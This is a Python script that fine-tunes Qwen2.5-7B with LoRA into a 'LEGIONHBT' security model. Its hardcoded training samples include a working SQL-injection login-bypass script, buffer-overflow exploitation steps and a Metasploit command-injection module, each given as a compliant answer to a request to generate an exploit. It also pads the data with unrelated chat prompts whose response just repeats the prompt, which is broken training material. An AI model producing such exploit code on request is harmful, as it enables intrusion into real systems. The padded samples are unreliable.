import os
import json
import torch
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    TrainingArguments,
    DataCollatorForLanguageModeling,
    Trainer
)
from peft import LoraConfig, get_peft_model, TaskType, PeftModel
from datasets import load_dataset, Dataset
import argparse


def load_hackmentor_dataset():
    dataset = load_dataset("fka/awesome-chatgpt-prompts", split="train")
    
    security_prompts = [
        {
            "instruction": "Analyze this CVE description and identify the vulnerability type, affected components, and potential impact.",
            "input": "CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
            "output": "Vulnerability Type: Remote Code Execution (RCE)\nAffected Component: Apache Log4j2 (versions 2.0-beta9 to 2.14.1)\nImpact: Critical - Allows attackers to execute arbitrary code via JNDI injection\nAttack Vector: Network-based, requires no authentication\nCVSS Score: 10.0 (Critical)"
        },
        {
            "instruction": "Generate a Python exploit script for an SQL injection vulnerability.",
            "input": "Target: http://example.com/login.php, Parameter: username, Database: MySQL",
            "output": "import requests\n\ndef exploit_sql_injection(url, param):\n    payload = \"' OR '1'='1' -- \"\n    data = {param: payload}\n    response = requests.post(url, data=data)\n    if 'welcome' in response.text.lower():\n        return 'Vulnerable to SQL injection'\n    return 'Not vulnerable'\n\nif __name__ == '__main__':\n    result = exploit_sql_injection('http://example.com/login.php', 'username')\n    print(result)"
        },
        {
            "instruction": "Explain how to detect and exploit a buffer overflow vulnerability.",
            "input": "Target: Linux x64 binary with stack canaries disabled",
            "output": "Detection:\n1. Send oversized input to application\n2. Monitor for crashes or segmentation faults\n3. Use pattern_create and pattern_offset to find exact offset\n\nExploitation:\n1. Find offset to return address\n2. Identify usable gadgets (ROP/JOP)\n3. Craft payload: [padding][return_address][shellcode]\n4. Execute to gain shell\n\nTools: GDB, pwntools, checksec"
        },
        {
            "instruction": "Analyze this network traffic capture for suspicious activity.",
            "input": "Multiple SYN packets to port 22 from single IP, followed by successful SSH authentication attempts with different usernames",
            "output": "Threat: SSH Brute Force Attack\nIndicators:\n- High volume of SYN packets to port 22\n- Multiple authentication attempts\n- Different usernames attempted\n\nMitigation:\n1. Implement fail2ban\n2. Disable password authentication\n3. Use key-based authentication only\n4. Change default SSH port\n5. Implement rate limiting"
        },
        {
            "instruction": "Generate a Metasploit module for a custom vulnerability.",
            "input": "Service: Custom HTTP server on port 8080, Vulnerability: Command injection in User-Agent header",
            "output": "require 'msf/core'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Custom HTTP Server Command Injection',\n      'Description' => %q{Command injection via User-Agent header},\n      'Author' => ['LEGIONHBT'],\n      'Platform' => 'linux',\n      'Targets' => [['Automatic', {}]],\n      'DisclosureDate' => '2024-01-01'\n    ))\n  end\n\n  def exploit\n    send_request_cgi({\n      'uri' => '/',\n      'headers' => {\n        'User-Agent' => ";#{payload.encoded};"\n      }\n    })\n  end\nend"
        }
    ]
    
    formatted_data = []
    for item in security_prompts:
        text = f"### Instruction:\n{item['instruction']}\n\n### Input:\n{item['input']}\n\n### Response:\n{item['output']}"
        formatted_data.append({"text": text})
    
    for i in range(min(100, len(dataset))):
        item = dataset[i]
        text = f"### Instruction:\n{item.get('act', 'Analyze security context')}\n\n### Input:\n{item.get('prompt', '')}\n\n### Response:\n{item.get('prompt', '')}"
        formatted_data.append({"text": text})
    
    return Dataset.from_list(formatted_data)


def setup_model(model_name="Qwen/Qwen2.5-7B"):
    print(f"Loading base model: {model_name}")
    
    tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    
    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float32,
        device_map="cpu",
        trust_remote_code=True,
        low_cpu_mem_usage=True
    )
    
    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        r=16,
        lora_alpha=32,
        lora_dropout=0.1,
        target_modules=["q_proj", "k_proj", "v_proj", "o_proj", "gate_proj", "up_proj", "down_proj"],
        bias="none"
    )
    
    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()
    
    return model, tokenizer


def train_model(model, tokenizer, dataset, output_dir="./legionhbt-model-finetuned"):
    print("Preparing training data...")
    
    def tokenize_function(examples):
        return tokenizer(
            examples["text"],
            truncation=True,
            max_length=512,
            padding="max_length"
        )
    
    tokenized_dataset = dataset.map(tokenize_function, batched=True)
    
    training_args = TrainingArguments(
        output_dir=output_dir,
        overwrite_output_dir=True,
        num_train_epochs=3,
        per_device_train_batch_size=1,
        gradient_accumulation_steps=4,
        learning_rate=2e-4,
        warmup_steps=100,
        logging_steps=10,
        save_steps=500,
        save_total_limit=2,
        fp16=False,
        optim="adamw_torch",
        report_to="none"
    )
    
    data_collator = DataCollatorForLanguageModeling(
        tokenizer=tokenizer,
        mlm=False
    )
    
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=tokenized_dataset,
        data_collator=data_collator
    )
    
    print("Starting training...")
    trainer.train()
    
    print(f"Saving model to {output_dir}")
    trainer.save_model(output_dir)
    tokenizer.save_pretrained(output_dir)
    
    model.save_pretrained(f"{output_dir}/lora_adapter")
    
    print("Training complete!")
    return output_dir


def export_to_safetensors(model_path, output_path="./legionhbt-model-safetensors"):
    from safetensors.torch import save_file
    import os
    
    print(f"Exporting model to safetensors format...")
    
    model = AutoModelForCausalLM.from_pretrained(
        model_path,
        torch_dtype=torch.float32,
        device_map="cpu"
    )
    
    os.makedirs(output_path, exist_ok=True)
    
    state_dict = model.state_dict()
    save_file(state_dict, f"{output_path}/model.safetensors")
    
    config = model.config.to_dict()
    with open(f"{output_path}/config.json", "w") as f:
        json.dump(config, f, indent=2)
    
    print(f"Model exported to {output_path}")
    return output_path


def main():
    parser = argparse.ArgumentParser(description="Train LEGIONHBT Security Model")
    parser.add_argument("--base-model", default="Qwen/Qwen2.5-7B", help="Base model name")
    parser.add_argument("--output-dir", default="./legionhbt-model-finetuned", help="Output directory")
    parser.add_argument("--export-safetensors", action="store_true", help="Export to safetensors format")
    args = parser.parse_args()
    
    print("Loading dataset...")
    dataset = load_hackmentor_dataset()
    print(f"Dataset size: {len(dataset)} samples")
    
    model, tokenizer = setup_model(args.base_model)
    
    output_dir = train_model(model, tokenizer, dataset, args.output_dir)
    
    if args.export_safetensors:
        export_to_safetensors(output_dir)
    
    print("Training pipeline complete!")


if __name__ == "__main__":
    main()